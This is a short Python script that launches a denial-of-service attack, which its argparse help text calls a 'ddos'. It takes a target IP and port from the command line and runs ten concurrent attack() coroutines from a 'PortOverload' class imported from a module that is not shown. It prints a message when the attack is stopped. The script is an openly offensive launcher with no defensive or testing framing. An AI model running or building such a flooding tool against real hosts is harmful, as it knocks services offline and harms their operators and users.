from modules1 import *
import modules1
import argparse
import asyncio

parser = argparse.ArgumentParser(description="Parse ip and port to ddos")

parser.add_argument("-i", type=str, default='127.0.0.1' ,help="Ip to attack")
parser.add_argument("-p", type=int, default=80, help="port to attack")

args = parser.parse_args()
IP = args.i
PORT = args.p

if __name__ == "__main__":
    try:
        target = PortOverload(IP,PORT)
    
        loop = asyncio.get_event_loop()
        tasks = [target.attack() for _ in range(10)]
        loop.run_until_complete(asyncio.gather(*tasks))
    
    except KeyboardInterrupt:
        print("\n[*]YOU STOPPED THE ATTACK[*]\n")